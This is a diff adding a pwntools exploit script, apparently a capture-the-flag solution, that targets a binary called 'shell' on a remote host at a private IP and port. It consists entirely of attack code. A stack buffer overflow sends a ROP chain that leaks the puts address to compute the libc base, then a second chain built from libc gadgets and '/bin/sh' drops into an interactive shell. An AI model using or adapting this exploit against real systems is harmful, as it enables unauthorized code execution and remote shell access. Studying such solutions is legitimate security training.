@@ -1,0 +1,26 @@
+from pwn import *
+context(arch = 'amd64',os = 'linux',log_level ='DEBUG',terminal=["tmux","splitw","-h"])
+#p=process("./shell")
+p = remote("10.212.27.23", 4396)
+elf=ELF("./shell")
+pop_rdi=0x400863
+payload=b"A"*(0x20+8)
+payload+=p64(pop_rdi)
+payload+=p64(elf.got["puts"])
+payload+=p64(elf.plt["puts"])
+payload+=p64(elf.symbols["main"])
+p.sendlineafter("soft! try me :)\n",payload)
+puts_add=u64(p.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
+success(hex(puts_add))
+libc_base=puts_add-elf.libc.symbols['puts']
+success(hex(libc_base))
+bin_sh=libc_base+elf.libc.search(b"/bin/sh").__next__()
+payload1=b"A"*(0x8)
+payload1+=p64(0x1b500+libc_base)+p64(0x4000003b)
+payload1+=p64(pop_rdi)+p64(bin_sh)
+payload1+=p64(0x23a6a+libc_base)+p64(0)
+payload1+=p64(0x1b96+libc_base)+p64(0)
+payload1+=p64(0x2743+libc_base)+p64(elf.sym['main'])
+
+p.sendlineafter("soft! try me :)\n",payload1)
+p.interactive()
